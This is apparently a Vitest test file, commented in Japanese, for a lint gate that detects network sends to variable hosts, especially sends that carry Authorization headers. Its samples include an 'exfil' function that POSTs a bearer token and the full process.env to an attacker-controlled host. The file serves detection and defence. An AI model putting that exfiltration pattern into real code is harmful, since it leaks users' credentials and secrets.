import { createRequire } from 'node:module';
import { describe, expect, it } from 'vitest';

/*
 * `lint:network-targets` の**外側の証人**。
 *
 * この門は「送り先ホストが定数でない通信」を台帳で管理する。門の冒頭が書く
 * とおり、同じ穴が 2026-08 の監査で 3 回出ており、どれも `Authorization` を
 * 付けて送るので**絞り忘れはそのまま資格情報の流出**になる。
 *
 * 2026-08-26 の実測: `main()` の冒頭へ「常に成功」を差し込み、
 * `src/main/clients/` へ `Authorization: Bearer` を載せて可変ホストへ送る経路を
 * 足すと、**この門も self-test も lint:credential-use も lint:forbidden も
 * 全部緑**になった。走査が `main()` の中にしか無く、証人が置けなかった。
 *
 * 標本は「見つけたい形」で選ぶ。正規表現を写すと、表を書き換えたときに
 * 検査も一緒に動いて何も留めない。
 */
const req = createRequire(import.meta.url);
const gate = req('../../../scripts/lint-network-targets.cjs') as {
  templateFindings: (rel: string, lines: string[]) => { file: string; line: number; template: string }[];
  bareSendFindings: (rel: string, lines: string[]) => { file: string; line: number; dest: string }[];
  outsideSendFindings: (rel: string, lines: string[]) => { file: string; line: number; call: string }[];
  outsidePopulation: () => string[];
  hasConstantHost: (template: string) => boolean;
  REVIEWED: unknown[];
  REVIEWED_VARIABLE_DESTINATIONS: unknown[];
  REVIEWED_OUTSIDE_SENDS: { file: string; needle: string; guard: string }[];
  NETWORK_CALL_NAMES: string[];
  OUTSIDE_SEND_NAMES: string[];
  OUTSIDE_POPULATION_FLOOR: number;
};

const tpl = (src: string) => gate.templateFindings('src/main/clients/x.ts', src.split('\n'));
const bare = (src: string) => gate.bareSendFindings('src/main/clients/x.ts', src.split('\n'));
const outside = (src: string) => gate.outsideSendFindings('scripts/x.cjs', src.split('\n'));

describe('lint:network-targets — 外側の証人', () => {
  it.each([
    ['★ 素の fetch でホストが変数', 'await fetch(`https://${cfg.host}/v1/sync`, init);'],
    ['★ Authorization つきで可変ホストへ (門が防ぎたい当の形)',
      'await fetch(`https://${host}/rest/api/3/issue`, { headers: { Authorization: `Bearer ${t}` } });'],
    ['★ ラッパ経由でも同じ', 'await jsonFetch(`https://${cfg.instanceUrl}/services/data`, init);'],
    ['★ プロキシ経由でも同じ', 'await fetchViaProxy(`https://${base}/api/v1`, init);'],
    ['★ ホストが先頭の変数 (小文字なので定数ではない)', 'await fetch(`${cfg.base}/v1/x`, init);'],
    ['★ url 代入の形 (呼び出しが同じ行に無くても拾う)', 'const url = `https://${host}/v1/x`;'],
  ])('%s', (_n, line) => {
    expect(tpl(line).length).toBeGreaterThan(0);
  });

  it.each([
    ['ホストがリテラル', 'await fetch(`https://api.github.com/repos/${owner}/${repo}`, init);'],
    ['ホストが ALL_CAPS の定数', 'await fetch(`${HIBP_BASE}/breachedaccount/${e}`, init);'],
    ['パスだけが変数', 'await fetch(`https://api.stripe.com/v1/${resource}`, init);'],
    ['URL ですらないテンプレート', 'throw new Error(`HTTP ${res.status}`);'],
    ['ヘッダのテンプレート', 'const h = { Authorization: `Bearer ${token}` };'],
  ])('陰性: %s は報告されない', (_n, line) => {
    expect(tpl(line)).toHaveLength(0);
  });

  /*
   * `hasConstantHost` は 2026-08-22 に「スキームで始まる = ホストはリテラル」と
   * 決めつけていて、**探している当のものが唯一の素通り口**になっていた。
   * 権限部だけを見る形に直っていることを、外から留める。
   */
  it.each([
    ['https + 変数ホスト', '`https://${host}/v1`', false],
    ['https + リテラルホスト', '`https://api.github.com/v1`', true],
    ['先頭が小文字の変数', '`${cfg.base}/v1`', false],
    ['先頭が ALL_CAPS の定数', '`${OLLAMA_BASE}/api/tags`', true],
    ['ホストはリテラルでパスが変数', '`https://api.x.com/${id}`', true],
    ['ポートが変数', '`https://api.x.com:${port}/v1`', false],
  ])('hasConstantHost: %s', (_n, template, want) => {
    expect(gate.hasConstantHost(template)).toBe(want);
  });

  it('★ 送り先が丸ごと変数の送信を拾う', () => {
    expect(bare('await fetch(cfg.url, init);').length).toBeGreaterThan(0);
  });

  it('★ 変数のホスト + 定数の経路 (`${creds.site}${JIRA_ISSUE_PATH}`) も拾う (パス 321 まで素通り)', () => {
    // `${…}/` を要求する「URL らしさ」の門が、補間の直後に補間が続く形を「URL ではない」と
    // 落としていた。経路をリテラルから定数へ寄せる refactor が、そのまま監視の外へ出る形。
    expect(tpl('await transport(`${creds.site}${JIRA_ISSUE_PATH}`, init);')).toHaveLength(1);
    expect(tpl('await jsonFetch(`${creds.site}${JIRA_ISSUE_PATH}`, init, ctx);')).toHaveLength(1);
    // 対照: ホストが ALL_CAPS の定数なら台帳には載せない (経路の補間は別の関心事)。
    expect(tpl('await transport(`${GITHUB_API}${path}`, init);')).toHaveLength(0);
  });

  it('陰性: 注釈の中は拾わない', () => {
    expect(bare('// await fetch(cfg.url, init);')).toHaveLength(0);
  });

  /*
   * 台帳と「通信とみなす名前」の一覧が空にされていないこと。
   * 標本は「1 つでも当たれば通る」ので、表を痩せさせる潰し方は別に留める。
   */
  it('★ 通信とみなす名前に fetch が入っている (2026-08-22 に抜けていた)', () => {
    expect(gate.NETWORK_CALL_NAMES).toContain('fetch');
    expect(gate.NETWORK_CALL_NAMES.length).toBeGreaterThanOrEqual(9);
  });

  it('★ レビュー済みの台帳が空にされていない', () => {
    expect(gate.REVIEWED.length).toBeGreaterThanOrEqual(10);
    expect(gate.REVIEWED_VARIABLE_DESTINATIONS.length).toBeGreaterThanOrEqual(1);
  });

  /*
   * **`src` の外の網の口** (2026-09-20 · パス 342)。
   *
   * 上の 2 つの検出器は `ROOTS`（= `src`）の `.ts` / `.tsx` しか読まない。
   * 2026-09-20 の実測: `scripts/_control342.cjs` に
   *
   *     fetch(`https://${host}/v1/collect`, {
   *       headers: { Authorization: `Bearer ${token}` },
   *       body: JSON.stringify({ env: process.env }),
   *     })
   *
   * を置くと**この門を含む 37 ゲートすべてが exit 0**、同じコードを `src/` へ
   * 置くとこの門が鳴った。**差は検出器ではなく走査範囲だけ**である。
   *
   * 直し方は「`ROOTS` を広げる」ではない —— 広げると 20 件出て真陽性は 0 件
   * (ゲート自身の self-test の標本)、かつ `src` の外の実物 3 件は**どれも
   * 送り先が素の識別子**なので `BARE_SEND` が意図して見ない。つまり
   * **広げてもこの 3 つは 1 件も見えない。** 母集団が小さいことを使って
   * 「変数の送り先だけ」ではなく**全件**を台帳に載せる形にした。
   */
  describe('src の外の網の口 (パス 342)', () => {
    it('★ 対照そのもの: CI で走る script の「可変ホスト + 資格情報 + process.env」を拾う', () => {
      const found = outside(
        [
          'async function exfil(host, token) {',
          '  return fetch(`https://${host}/v1/collect`, {',
          "    method: 'POST',",
          '    headers: { Authorization: `Bearer ${token}` },',
          '    body: JSON.stringify({ env: process.env }),',
          '  });',
          '}',
        ].join('\n'),
      );
      expect(found).toHaveLength(1);
      expect(found[0]!.line).toBe(2);
    });

    it.each([
      ['素の識別子の送り先 (BARE_SEND が意図して見ない形)', 'const r = await fetch(url, init);'],
      ['差し替え可能な既定引数', 'const res = await fetchImpl(current, init);'],
      ['プロパティ経由の呼び出し', 'await deps.fetchImpl(current, init);'],
      ['Node の HTTP API', 'https.request(opts, cb);'],
    ])('★ 陽性: %s', (_n, line) => {
      expect(outside(line)).toHaveLength(1);
    });

    it.each([
      // 落とさないと台帳が 14 行になり、本当に見たい 3 件が埋もれる (実測)。
      ['ゲート自身の self-test の文字列標本', "  ['素の fetch', 'await fetch(`https://${h}/x`);', true],"],
      ['行コメント', '// await fetch(url, init);'],
      ['通信でない呼び出し', 'await render(url, init);'],
      ['名前の一部に含まれるだけ', 'await prefetchAll(url);'],
    ])('陰性: %s は報告されない', (_n, line) => {
      expect(outside(line)).toHaveLength(0);
    });

    it('陰性: ブロックコメントの中は報告されない', () => {
      expect(outside(['/*', ' * await fetch(url, init);', ' */'].join('\n'))).toHaveLength(0);
    });

    it('★ 母集団は `src` の外だけで、床を持つ (走査が死んで 0 件を「健全」と読まないため)', () => {
      const pop = gate.outsidePopulation();
      expect(pop.length).toBeGreaterThanOrEqual(gate.OUTSIDE_POPULATION_FLOOR);
      expect(pop.every((f) => !f.startsWith('src/'))).toBe(true);
      // 生成物 (dist/ dist-electron/) は git が無視するので入らない。
      expect(pop.some((f) => f.startsWith('dist'))).toBe(false);
      // 実在する根が消えていないこと (向きを持った標本)。
      expect(pop).toContain('scripts/ollama-cli.cjs');
      expect(pop).toContain('assets/sw.js');
    });

    it('★ 台帳の 3 件は、守りを実際に書いている (空欄を理由として通さない)', () => {
      expect(gate.REVIEWED_OUTSIDE_SENDS).toHaveLength(3);
      for (const row of gate.REVIEWED_OUTSIDE_SENDS) {
        expect(row.guard.length).toBeGreaterThan(40);
        // 「あとで決める」を理由の欄に置けない (パス 336 と同じ規則)。
        expect(row.guard).not.toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
      }
      // 針が実際にその文面へ当たることを、同じ検査の中で標本で確かめる。
      expect('分かる人が決めること').toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
      expect('TODO: あとで').toMatch(/分かる人が決め|わかる人が決め|誰かが決め|要検討|TODO/);
    });

    it('★ 見る名前の一覧は `src` 側の一覧を含み、Node 側の綴りを足している', () => {
      for (const n of gate.NETWORK_CALL_NAMES) expect(gate.OUTSIDE_SEND_NAMES).toContain(n);
      expect(gate.OUTSIDE_SEND_NAMES).toContain('fetchImpl');
      expect(gate.OUTSIDE_SEND_NAMES).toContain('https.request');
    });
  });
});
